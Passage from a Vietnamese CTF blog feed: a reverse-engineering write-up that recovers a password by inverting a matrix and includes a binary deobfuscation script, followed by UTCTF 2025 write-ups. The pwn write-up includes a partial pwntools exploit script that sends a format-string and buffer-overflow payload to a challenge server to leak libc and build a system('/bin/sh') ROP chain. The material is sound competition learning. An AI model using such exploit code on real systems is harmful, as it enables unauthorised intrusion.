=&gt; 0x55555555604a:	mov    rdx,QWORD PTR [rax+0x10]
=&gt; 0x555555556066:	mov    rax,QWORD PTR [rbp-0x8]
=&gt; 0x555555556082:	shl    rax,0x3
=&gt; 0x5555555560a4:	add    rax,rdx
=&gt; 0x5555555560cb:	mov    rdx,QWORD PTR [rax]
=&gt; 0x5555555560ec:	mov    rax,QWORD PTR [rbp-0x30]
=&gt; 0x55555555610e:	mov    QWORD PTR [rax],rdx
=&gt; 0x555555556136:	mov    eax,0x1
=&gt; 0x555555556157:	leave
=&gt; 0x555555556161:	ret

=&gt; 0x555555556db9:	test   al,al
=&gt; 0x555555556ddb:	je     0x555555556e48
=&gt; 0x555555556e5a:	mov    eax,DWORD PTR [rbp-0x28]
=&gt; 0x555555556e81:	movsxd rdx,eax
=&gt; 0x555555556ea8:	mov    eax,DWORD PTR [rbp-0x24]
=&gt; 0x555555556ecf:	movsxd rsi,eax
=&gt; 0x555555556ef0:	lea    rcx,[rbp-0x18]
=&gt; 0x555555556f0c:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x555555556f2e:	mov    rdi,rax
=&gt; 0x555555556f56:	call   0x555555555ca0
...........

=&gt; 0x555555556fa0:	test   al,al
=&gt; 0x555555556fc2:	je     0x55555555702f
=&gt; 0x55555555703b:	mov    rdx,QWORD PTR [rbp-0x20]
=&gt; 0x555555557057:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555557073:	imul   rax,rdx
=&gt; 0x55555555708f:	add    QWORD PTR [rbp-0x10],rax
=&gt; 0x5555555570ab:	add    DWORD PTR [rbp-0x24],0x1
=&gt; 0x5555555570cd:	mov    eax,DWORD PTR [rbp-0x24]
=&gt; 0x5555555570f4:	movsxd rdx,eax
=&gt; 0x555555557115:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x555555557137:	mov    rax,QWORD PTR [rax]
=&gt; 0x55555555715e:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 4, $rax = 4
=&gt; 0x555555557188:	jb     0x555555556bf9
=&gt; 0x5555555571b5:	mov    eax,DWORD PTR [rbp-0x28]
=&gt; 0x5555555571dc:	movsxd rdx,eax
=&gt; 0x555555557203:	mov    eax,DWORD PTR [rbp-0x2c]
=&gt; 0x55555555722a:	movsxd rsi,eax
=&gt; 0x55555555724b:	mov    rcx,QWORD PTR [rbp-0x10]
=&gt; 0x555555557267:	mov    rax,QWORD PTR [rbp-0x48]
=&gt; 0x555555557289:	mov    rdi,rax
=&gt; 0x5555555572b1:	call   0x555555556180
=&gt; 0x55555555618c:	endbr64
=&gt; 0x5555555561a5:	push   rbp
=&gt; 0x5555555561c1:	mov    rbp,rsp
=&gt; 0x5555555561e2:	sub    rsp,0x30
=&gt; 0x5555555561fe:	mov    QWORD PTR [rbp-0x18],rdi
=&gt; 0x55555555621a:	mov    QWORD PTR [rbp-0x20],rsi
=&gt; 0x555555556236:	mov    QWORD PTR [rbp-0x28],rdx
=&gt; 0x555555556252:	mov    QWORD PTR [rbp-0x30],rcx
=&gt; 0x55555555626e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555556290:	mov    rax,QWORD PTR [rax]
=&gt; 0x5555555562b1:	cmp    QWORD PTR [rbp-0x20],rax
    ‚Üí cmp operands: [rbp-0x20] = N/A, $rax = 4
=&gt; 0x5555555562d6:	jb     0x555555556343
=&gt; 0x55555555634f:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555636b:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555556387:	cmp    QWORD PTR [rbp-0x28],rax
    ‚Üí cmp operands: [rbp-0x28] = N/A, $rax = 4
=&gt; 0x5555555563ac:	jb     0x555555556419
=&gt; 0x555555556425:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555556441:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555556464:	imul   rax,QWORD PTR [rbp-0x20]
=&gt; 0x55555555648e:	mov    rdx,rax
=&gt; 0x5555555564af:	mov    rax,QWORD PTR [rbp-0x28]
=&gt; 0x5555555564d1:	add    rax,rdx
=&gt; 0x5555555564f2:	mov    QWORD PTR [rbp-0x8],rax
=&gt; 0x55555555650e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555652a:	mov    rdx,QWORD PTR [rax+0x10]
=&gt; 0x555555556546:	mov    rax,QWORD PTR [rbp-0x8]
=&gt; 0x555555556562:	shl    rax,0x3
=&gt; 0x555555556584:	add    rdx,rax
=&gt; 0x5555555565a5:	mov    rax,QWORD PTR [rbp-0x30]
=&gt; 0x5555555565c7:	mov    QWORD PTR [rdx],rax
=&gt; 0x5555555565ef:	mov    eax,0x1
=&gt; 0x555555556610:	leave
=&gt; 0x55555555661a:	ret
=&gt; 0x5555555572fb:	test   al,al
=&gt; 0x55555555731d:	je     0x55555555738a
=&gt; 0x555555557396:	add    DWORD PTR [rbp-0x28],0x1
=&gt; 0x5555555573b8:	mov    eax,DWORD PTR [rbp-0x28]
=&gt; 0x5555555573df:	movsxd rdx,eax
=&gt; 0x555555557400:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x55555555741c:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x55555555743e:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 4, $rax = 4
=&gt; 0x555555557468:	jb     0x555555556b5b
=&gt; 0x55555555748f:	add    DWORD PTR [rbp-0x2c],0x1
=&gt; 0x5555555574b1:	mov    eax,DWORD PTR [rbp-0x2c]
=&gt; 0x5555555574d8:	movsxd rdx,eax
=&gt; 0x5555555574f9:	mov    rax,QWORD PTR [rbp-0x38]
=&gt; 0x55555555751b:	mov    rax,QWORD PTR [rax]
=&gt; 0x555555557542:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 4, $rax = 4
=&gt; 0x55555555756c:	jb     0x555555556af1
=&gt; 0x55555555759a:	mov    eax,0x1
=&gt; 0x5555555575be:	mov    rdx,QWORD PTR [rbp-0x8]
.......
</code></pre><p>M√¨nh ƒë·ªçc ƒëo·∫°n m√£ n√†y trong text l·∫°i kh√° l√† d√†i v√† c≈©ng kh√¥ng hi·ªÉu r√µ n√≥ l√†m g√¨. Nh·ªù g·ª£i √Ω c·ªßa m·ªçi ng∆∞·ªùi n√™n m√¨nh th·ª≠ m·ªôt v√†i input ƒë·∫∑c bi·ªát r·ªìi debug, cu·ªëi c√πng m√¨nh ƒëo√°n ƒë∆∞·ª£c ƒë√¢y l√† m·ªôt ƒëo·∫°n m√£ th·ª±c hi·ªán vi·ªác nh√¢n ma tr·∫≠n ƒë∆∞·ª£c t·∫°o t·ª´ input v√† 1 ma tr·∫≠n ƒë∆∞·ª£c ch∆∞∆°ng tr√¨nh t·∫°o s·∫µn.</p>
<pre tabindex="0"><code>=&gt; 0x55555555c890:	mov    eax,DWORD PTR [rbp-0x284]  i  //loop 2
=&gt; 0x55555555c8c0:	cmp    eax,DWORD PTR [rbp-0x280]  // j
    ‚Üí cmp operands: $eax = 0, DWORD PTR [rbp-0x280] = N/A // cmp j,i
=&gt; 0x55555555c8f0:	jne    0x55555555caa5

=&gt; 0x55555555c927:	movzx  edx,BYTE PTR [rbp-0x295]       edx=1(1)
=&gt; 0x55555555c966:	mov    rax,QWORD PTR [rbp-0x278]    
=&gt; 0x55555555c995:	cmp    rax,0x1                            
    ‚Üí cmp operands: $rax = -600, 0x1 = 1              cmp q(0x7fffffffda68),1
=&gt; 0x55555555c9b7:	sete   al          // al=0
=&gt; 0x55555555c9de:	movzx  eax,al
=&gt; 0x55555555c9fe:	and    eax,edx         // eax=0
=&gt; 0x55555555ca16:	test   eax,eax      
=&gt; 0x55555555ca35:	setne  al         // al=1
=&gt; 0x55555555ca5f:	mov    BYTE PTR [rbp-0x295],al ///   BYTE PTR [rbp-0x295] =1
=&gt; 0x55555555ca8d:	jmp    0x55555555cc1f
=&gt; 0x55555555cc3b:	add    DWORD PTR [rbp-0x280],0x1               // counter DWORD PTR [rbp-0x280]
=&gt; 0x55555555cc7a:	cmp    DWORD PTR [rbp-0x280],0x3
    ‚Üí cmp operands: DWORD PTR [rbp-0x280] = N/A, 0x3 = 3
=&gt; 0x55555555ccb2:	jle    0x55555555c6fd


=&gt; 0x55555555c712:	mov    eax,DWORD PTR [rbp-0x280] 
=&gt; 0x55555555c73f:	movsxd rdx,eax                 //rdx=j
=&gt; 0x55555555c769:	mov    eax,DWORD PTR [rbp-0x284]
=&gt; 0x55555555c796:	movsxd rsi,eax            //rsi =i
=&gt; 0x55555555c7c7:	lea    rcx,[rbp-0x278]        // rcx=0
=&gt; 0x55555555c806:	lea    rax,[rbp-0x230]        // rax=4; rbp-0x230=4
=&gt; 0x55555555c83b:	mov    rdi,rax                 //rdi=4
=&gt; 0x55555555c863:	call   0x555555555ca0
=&gt; 0x555555555cac:	endbr64                                                     
=&gt; 0x555555555cc5:	push   rbp
=&gt; 0x555555555ce1:	mov    rbp,rsp
=&gt; 0x555555555d02:	sub    rsp,0x30
=&gt; 0x555555555d1e:	mov    QWORD PTR [rbp-0x18],rdi //4
=&gt; 0x555555555d3a:	mov    QWORD PTR [rbp-0x20],rsi // i
=&gt; 0x555555555d56:	mov    QWORD PTR [rbp-0x28],rdx // j
=&gt; 0x555555555d72:	mov    QWORD PTR [rbp-0x30],rcx //0
=&gt; 0x555555555d8e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555db0:	mov    rax,QWORD PTR [rax]   // rax=4
=&gt; 0x555555555dd1:	cmp    QWORD PTR [rbp-0x20],rax 
    ‚Üí cmp operands: [rbp-0x20] = N/A, $rax = 4
=&gt; 0x555555555df6:	jb     0x555555555e63
=&gt; 0x555555555e6f:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555e8b:	mov    rax,QWORD PTR [rax+0x8] // rax=4
=&gt; 0x555555555ea7:	cmp    QWORD PTR [rbp-0x28],rax /// cmp counter, 4
    ‚Üí cmp operands: [rbp-0x28] = N/A, $rax = 4
=&gt; 0x555555555ecc:	jb     0x555555555f39
=&gt; 0x555555555f45:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555f61:	mov    rax,QWORD PTR [rax+0x8]    //rax=4
=&gt; 0x555555555f84:	imul   rax,QWORD PTR [rbp-0x20] 
=&gt; 0x555555555fae:	mov    rdx,rax                    // rdx=4*i
=&gt; 0x555555555fcf:	mov    rax,QWORD PTR [rbp-0x28]
=&gt; 0x555555555ff1:	add    rax,rdx                         // rax=4*i+j
=&gt; 0x555555556012:	mov    QWORD PTR [rbp-0x8],rax   // QWORD PTR [rbp-0x8]=4*i+j= k
=&gt; 0x55555555602e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555604a:	mov    rdx,QWORD PTR [rax+0x10]  
=&gt; 0x555555556066:	mov    rax,QWORD PTR [rbp-0x8]
=&gt; 0x555555556082:	shl    rax,0x3                     
=&gt; 0x5555555560a4:	add    rax,rdx                  
=&gt; 0x5555555560cb:	mov    rdx,QWORD PTR [rax]       
=&gt; 0x5555555560ec:	mov    rax,QWORD PTR [rbp-0x30] 
=&gt; 0x55555555610e:	mov    QWORD PTR [rax],rdx      
=&gt; 0x555555556136:	mov    eax,0x1
=&gt; 0x555555556157:	leave
=&gt; 0x555555556161:	ret
......
</code></pre><p>ƒê·ªçc ti·∫øp trong file log.txt, ch∆∞∆°ng tr√¨nh sau khi nh√¢n ma tr·∫≠n s·∫Ω x·ª≠ l√Ω duy·ªát qua tr·∫≠n tr·∫≠n thu ƒë∆∞·ª£c v√† ki·ªÉm tra xem li·ªáu v·ªõi c√°c gi√° tr·ªã c√≥ index h√†ng b·∫±ng index c·ªôt th√¨ c√≥ b·∫±ng 1 hay kh√¥ng, v·ªõi c√°c gi√° tr·ªã c√≤n l·∫°i c√≥ b·∫±ng 0 hay kh√¥ng. N√≥i c√°ch kh√°c, ch∆∞∆°ng tr√¨nh so s√°nh ma tr·∫≠n thu ƒë∆∞·ª£c sau ph√©p nh√¢n v·ªõi ma tr·∫≠n ƒë∆°n v·ªã. M√¨nh r√∫t g·ªçn l·∫°i logic c·ªßa ƒëo·∫°n n√†y nh∆∞ sau:</p>
<pre tabindex="0"><code>
=&gt; 0x55555555c8f0:	jne    0x55555555caa5
ZF=0   {
=&gt; 0x55555555cac1:	movzx  edx,BYTE PTR [rbp-0x295]
=&gt; 0x55555555cb00:	mov    rax,QWORD PTR [rbp-0x278]
=&gt; 0x55555555cb35:	test   rax,rax
=&gt; 0x55555555cb5c:	sete   al
=&gt; 0x55555555cb83:	movzx  eax,al
=&gt; 0x55555555cba3:	and    eax,edx
=&gt; 0x55555555cbbb:	test   eax,eax
=&gt; 0x55555555cbda:	setne  al
=&gt; 0x55555555cc04:	mov    BYTE PTR [rbp-0x295],al  
										}
}

ZF !=0 {
=&gt; 0x55555555c927:	movzx  edx,BYTE PTR [rbp-0x295]       
=&gt; 0x55555555c966:	mov    rax,QWORD PTR [rbp-0x278]    
=&gt; 0x55555555c995:	cmp    rax,0x1                            
    ‚Üí cmp operands: $rax = -600, 0x1 = 1             
=&gt; 0x55555555c9b7:	sete   al          // al=0
=&gt; 0x55555555c9de:	movzx  eax,al
=&gt; 0x55555555c9fe:	and    eax,edx         // eax=0
=&gt; 0x55555555ca16:	test   eax,eax      
=&gt; 0x55555555ca35:	setne  al         // al=1
=&gt; 0x55555555ca5f:	mov    BYTE PTR [rbp-0x295],al ///   BYTE PTR [rbp-0x295] =1
}
</code></pre><p>ƒê·∫øn l√∫c n√†y, ch√∫ng ta ƒë√£ nh√¨n ra v·∫•n ƒë·ªÅ: Input c·ªßa ch√∫ng ta s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω b·ªè k√Ω t·ª± &lsquo;-&rsquo;, th·ª±c hi·ªán bi·∫øn ƒë·ªïi nh∆∞ tr√™n r·ªìi t·∫£i v√†o ma tr·∫≠n, nh√¢n ma tr·∫≠n v·ªõi m·ªôt ma tr·∫≠n cho s·∫µn r·ªìi so s√°nh v·ªõi ma tr·∫≠n ƒë∆°n v·ªã. Vi·ªác cu·ªëi c√πng m√¨nh c·∫ßn l√†m l√† t√¨m ma tr·∫≠n cho s·∫µn. Debug l·∫°i v√† d·ªÖ d√†ng t√¨m ƒë∆∞·ª£c ma tr·∫≠n ƒë∆∞·ª£c ch∆∞∆°ng tr√¨nh t·∫°o s·∫µn ƒë·ªÉ nh√¢n:</p>
<p></p>
<p>Nh∆∞ v·∫≠y input ph·∫£i th·ªèa m√£n l√† ma tr·∫≠n ngh·ªãch ƒë·∫£o c·ªßa ma tr·∫≠n n√†y. M√¨nh t√¨m ma tr·∫≠n ngh·ªãch ƒë·∫£o, truy ng∆∞·ª£c v·ªÅ password v√† nh·∫≠p l·∫°i th√¨ m√¨nh t√¨m ƒë∆∞·ª£c flag.</p>
<p></p>
<h3 id="3-script">3. Script</h3>
<pre tabindex="0"><code>import numpy as np

A = np.array([
    [88, -17, 19, -57],
    [45, -9, 10, -29],
    [-56, 11, -12, 36],
    [-40, 8, -9, 26]
])


A_inv = np.linalg.inv(A)


res_rows = []
for i, row in enumerate(A_inv):
    row_chars = []
    for j, val in enumerate(row):
        ascii_code = int(round(val + i * j + 0x41))
        row_chars.append(chr(ascii_code))
    res_rows.append(&#39;&#39;.join(row_chars))
res = &#39;-&#39;.join(res_rows)

print(res)
</code></pre><h3 id="4-another-approach">4. Another approach</h3>
<p>Sau khi m√¨nh ƒë·ªçc writeup ch√≠nh th·ª©c, c√≥ v·∫ª nh∆∞ c√≥ h·∫≥n m·ªôt script ƒë·ªÉ deobfuscating file n√†y, v√† d√πng IDA decompile ƒë∆∞·ª£c lu√¥n :(. Vi·ªác n√†y s·∫Ω gi√∫p c√¥ng vi·ªác ph√¢n t√≠ch d·ªÖ h∆°n r·∫•t nhi·ªÅu l·∫ßn ( so v·ªõi ng·ªìi ƒë·ªçc full asm nh∆∞ m√¨nh ). M√¨nh s·∫Ω ƒë·ªÉ script b√™n d∆∞·ªõi cho m·ªçi ng∆∞·ªùi d√πng ( hy v·ªçng m·ªçi ng∆∞·ªùi d√πng n√≥ thay v√¨ c·ªë ƒë·ªçc h·∫øt code asm sinh ra t·ª´ script tr√™n kia). C√≤n l·∫°i logic c·ªßa ch∆∞∆°ng tr√¨nh v·ªÅ c∆° b·∫£n v·∫•n gi·ªëng b√™n tr√™n m√¨nh ƒë√£ tr√¨nh b√†y.</p>
<pre tabindex="0"><code>from pwn import *
import capstone
import sys
import ctypes

def xor(a, b):
    return bytes([a ^ b for a, b in zip(a, b)])

def disas_single(data):
    disas = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    inst = next(disas.disasm(data, 0))
    return inst, inst.size, inst.mnemonic

def deobufscate(elf, code, text_off, text_end, addr, modified):
    stop = False
    while not stop:
        inst, sz, mneumonic = disas_single(code[addr:])
        if mneumonic == &#39;ret&#39;:
            stop = True
        elif mneumonic == &#39;call&#39;:
            call_dst = addr + ctypes.c_int64(int(inst.op_str, 16)).value
            if call_dst &gt;= text_off and call_dst &lt;= text_end:
                deobufscate(elf, code, text_off, text_end, call_dst, modified)
        elif mneumonic == &#39;xor&#39;:
            if &#39;[rip + &#39; in inst.op_str:
                rip_rel = int(inst.op_str.split(&#39;[rip + &#39;)[1].split(&#39;]&#39;)[0], 16)
                key = int(inst.op_str.split(&#39;,&#39;)[1], 16)
                decrypt = b&#39;&#39;
                if inst.op_str.startswith(&#39;qword ptr &#39;):
                    decrypt = xor(p64(key), code[addr + sz + rip_rel: addr + sz + rip_rel + 8])
                elif inst.op_str.startswith(&#39;dword ptr &#39;):
                    decrypt = xor(p32(key), code[addr + sz + rip_rel: addr + sz + rip_rel + 4])
                elif inst.op_str.startswith(&#39;word ptr &#39;):
                    decrypt = xor(p16(key), code[addr + sz + rip_rel: addr + sz + rip_rel + 2])
                elif inst.op_str.startswith(&#39;byte ptr &#39;):
                    decrypt = xor(p8(key), code[addr + sz + rip_rel: addr + sz + rip_rel + 1])
                assert(len(decrypt) in [1, 2, 4, 8])
                for i, b in enumerate(decrypt):
                    modified[addr + sz + rip_rel + i] = b
                for i in range(addr, addr + sz):
                    modified[i] = 0x90
                if code[addr - 0x1] == 0x9c:
                    modified[addr - 0x1] = 0x90
                if code[addr + sz] == 0x9d:
                    modified[addr + sz] = 0x90
            elif &#39;[rip -&#39; in inst.op_str:
                for i in range(addr, addr + sz):
                    modified[i] = 0x90
                if code[addr - 0x1] == 0x9c:
                    modified[addr - 0x1] = 0x90
                if code[addr + sz] == 0x9d:
                    modified[addr + sz] = 0x90
            code = bytes(modified)
        addr += sz


if __name__ == &#39;__main__&#39;:
    if len(sys.argv) != 3:
        print(f&#39;{sys.argv[0]} obfuscated main_offset&#39;)
        exit(1)
    elf = ELF(sys.argv[1])
    main = int(sys.argv[2], 16)
    text_off = elf.get_section_by_name(&#39;.text&#39;).header.sh_offset
    text_end = elf.get_section_by_name(&#39;.text&#39;).header.sh_offset + elf.get_section_by_name(&#39;.text&#39;).header.sh_size
    sz = text_off + text_end
    with open(elf.path, &#39;rb&#39;) as f:
        full = f.read()
    data = full[:sz]
    modified = bytearray(data)
    deobufscate(elf, data, text_off, text_end, main, modified)
    with open(f&#39;{elf.path}_deobfuscate&#39;, &#39;wb&#39;) as f:
        f.write(bytes(modified) + full[sz:])
</code></pre>]]></description>
</item>
<item>
    <title>UTCTF 2025</title>
    <link>https://cr0nica1.github.io/posts/utctf/</link>
    <pubDate>Wed, 16 Apr 2025 03:03:35 &#43;0700</pubDate>
    <author>cr0nica1</author>
    <guid>https://cr0nica1.github.io/posts/utctf/</guid>
    <description><![CDATA[<p>Gi·∫£i n√†y m√¨nh tham gia song song v·ªõi K!nd4SUS CTF 2025 n√™n kh√¥ng c√≥ gi·∫£i ƒë∆∞·ª£c nhi·ªÅu. Tuy nhi√™n m√¨nh v·∫´n c√≥ 1 chall d·ªÖ rev v√† 1 chall pwn.</p>
<h2 id="ostrich-algorithm---reverse-engineering">Ostrich Algorithm - reverse engineering</h2>
<h3 id="1-analysis">1. Analysis</h3>
<p>S·ª≠ d·ª•ng IDA pro m·ªü file th√¨ ·ªü h√†m start m√¨nh nh√¨n th·∫•y ƒë∆∞·ª£c ƒëo·∫°n m√£ gi·∫£ nh∆∞ sau:</p>
<p></p>
<p>Do ch∆∞∆°ng tr√¨nh n√†y Statically linked, c·ªông v·ªõi c√°c tham s·ªë truy·ªÅn v√†o h√†m sub_404000 n√™n m√¨nh ƒëo√°n c√≥ v·∫ª ƒë√¢y l√† 1 h√†m gi·ªëng _libc_start_main. ƒê·ªçc k·ªπ h∆°n b√™n trong th√¨ m√¨nh g·∫ßn nh∆∞ ch·∫Øc ch·∫Øn ƒëi·ªÅu ƒë√≥, do v·∫≠y c√≥ v·∫ª h√†m Sub_401775 s·∫Ω l√† h√†m main.</p>
<p>
B√™n trong h√†m sub_401775 m√¨nh th·∫•y ch∆∞∆°ng tr√¨nh so s√°nh chu·ªói &ldquo;welcome to UTCTF!&rdquo; v√† chu·ªói &ldquo;oiiaoiiaoiiaoiia&rdquo;, n·∫øu kh√¥ng gi·ªëng nhau s·∫Ω g·ªçi sub_40c90. Ki·ªÉm tra b√™n trong h√†m n√†y c√πng v·ªõi th·ª≠ ƒë·∫∑t breakpoint t·∫°i ƒë√¢y khi debug, m√¨nh nh·∫≠n ra h√†m sub_401775 s·∫Ω tho√°t ch∆∞∆°ng tr√¨nh. Nh∆∞ v·∫≠y ch∆∞∆°ng tr√¨nh s·∫Ω lu√¥n d·ª´ng ·ªü ƒë√¢y. Do ƒë√≥ √Ω t∆∞·ªüng ban ƒë·∫ßu l√† m√¨nh th·ª≠ patch byte xem sao.</p>
<h3 id="2-patch-byte">2. Patch byte</h3>
<p>M√¨nh patch to√†n b·ªô l·ªánh g·ªçi h√†m sub_401775 b·∫±ng nop.</p>
<p></p>
<p>Thay to√†n b·ªô byte ·ªü ƒë√¢y th√†nh 0x90.</p>
<p></p>
<p>M√¨nh cho ch·∫°y th·ª≠ ch∆∞∆°ng tr√¨nh ·ªü ƒë√¢y v√† nh·∫≠n ƒë∆∞·ª£c flag.</p>
<p></p>
<h2 id="retirement-plan---binary-exploitation">RETirement plan - binary exploitation</h2>
<h3 id="1-vulnerability">1. Vulnerability</h3>
<p></p>
<p>Nh√¨n v√†o pseudocode, m√¨nh nh·∫≠n th·∫•y m·ªôt l·ªói bof ·ªü h√†m gets() v√† l·ªói format string ·ªü h√†m printf.
</p>
<p>Checksec ch∆∞∆°ng tr√¨nh nh·∫≠n th·∫•y kh√¥ng c√≥ b·∫•t k·ª≥ m·ªôt mitigation n√†o, ngo·∫°i tr·ª´ Partial RELRO. Do ƒë√≥ chall n√†y c√≥ r·∫•t nhi·ªÅu ph∆∞∆°ng √°n, ph∆∞∆°ng √°n c·ªßa m√¨nh tr√¨nh b√†y ·ªü ƒë√¢y l√† s·ª≠ d·ª•ng ROP.</p>
<h3 id="2-analysis">2. Analysis</h3>
<p>V√≤ng l·∫∑p for ngay b√™n d∆∞·ªõi h√†m gets l√† m·ªôt thu·∫≠t to√°n x·ª≠ l√Ω ƒë·ªÉ l·ªçc c√°c k√Ω t·ª± ƒë·ªôc h·∫°i nh·∫±m khai th√°c format string. Tuy nhi√™n thay v√¨ ki·ªÉm tra string format, ch∆∞∆°ng tr√¨nh l·∫°i g√°n format v√†o con tr·ªè v5 v√† th·ª±c hi·ªán r√† so√°t string v√†o con tr·ªè v5. Kh√¥ng nh·ªØng v·∫≠y, v√≤ng l·∫∑p s·∫Ω ch·∫°y ƒë·∫øn khi v5[i] c√≥ gi√° tr·ªã NULL. Nh∆∞ v·∫≠y √Ω t∆∞·ªüng c·ªßa m√¨nh s·∫Ω l√† ghi ƒë√® gi√° tr·ªã con tr·ªè v5 b·∫±ng 1 ƒë·ªãa ch·ªâ c√≥ quy·ªÅn rw m√† ·ªü ƒë·∫•y to√†n c√°c gi√° tr·ªã NULL. Sau ƒë√≥ m√¨nh s·∫Ω ghi ƒë√® ret_address b·∫±ng c√°c gadget nh·∫±m th·ª±c thi l·∫°i h√†m main 1 l·∫ßn n·ªØa sau khi ƒë√£ leak ƒë∆∞·ª£c ƒë·ªãa ch·ªâ libc tr√™n qua format string.</p>
<h3 id="3-exploitation">3. Exploitation</h3>
<p>Payload ƒë·∫ßu ti√™n c·ªßa m√¨nh s·∫Ω khai th√°c format string ƒë·ªÉ leak gi√° tr·ªã tr√™n stack, ƒë·ªìng th·ªùi ghi ƒë√® ret_address v·ªÅ h√†m main 1 l·∫ßn n·ªØa. Tr∆∞·ªõc ti√™n m√¨nh c·∫ßn t√¨m 1 v√πng nh·ªõ c√≥ quy·ªÅn rw m√† to√†n c√°c gi√° tr·ªã NULL ƒë·ªÉ gi ƒë√® v5.
</p>
<p></p>
<p>v·∫≠y l√† ƒë√£ c√≥ v√πng nh·ªõ ghi ƒë√® v√†o v5. M√¨nh s·∫Ω th·ª≠ g·ª≠i payload xem ch√∫ng ta thu ƒë∆∞·ª£c g√¨.</p>
<p></p>
<p></p>
<p>Check gi√° tr·ªã thu ƒë∆∞·ª£c, ch√∫ng ta bi·∫øt ƒë∆∞·ª£c r·∫±ng ƒë·ªãa ch·ªâ n√†y l√† ƒë·ªãa ch·ªâ c·ªßa h√†m <em>IO_2_1_stdin</em> trong libc.</p>
<p>vi·ªác c√≤n l·∫°i kh√° l√† ƒë∆°n gi·∫£n, payload th·ª© 2 ch√∫ng ta ch·ªâ c·∫ßn ghi ƒë√® c√°c gadget ƒë·ªÉ th·ª±c thi system(/bin/sh) l√† xong.</p>
<p></p>
<p></p>
<p>K·∫øt n·ªëi v√†o m√°y remote ta thu ƒë∆∞·ª£c flag.</p>
<p></p>
<h3 id="4-script">4. Script</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./shellcode_patched&#34;</span>,checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.23.so&#34;</span>,checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>rw_section<span style="color:#f92672">=</span><span style="color:#ae81ff">0x601000</span>
</span></span><span style="display:flex;"><span>main<span style="color:#f92672">=</span><span style="color:#ae81ff">0x400616</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;challenge.utctf.live&#39;</span>,<span style="color:#ae81ff">9009</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;Insert prompt here&gt;: &#39;</span>)
</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%3$p &#39;</span>
</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x30</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x601200</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">3</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">+</span>p64(main)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>leak<span style="color:#f92672">=</span>int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span>),<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>libc_base<span style="color:#f92672">=</span> leak<span style="color:#f92672">-</span>libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;_IO_2_1_stdin_&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Leak: </span><span style="color:#e6db74">{</span>hex(leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;libc base: </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
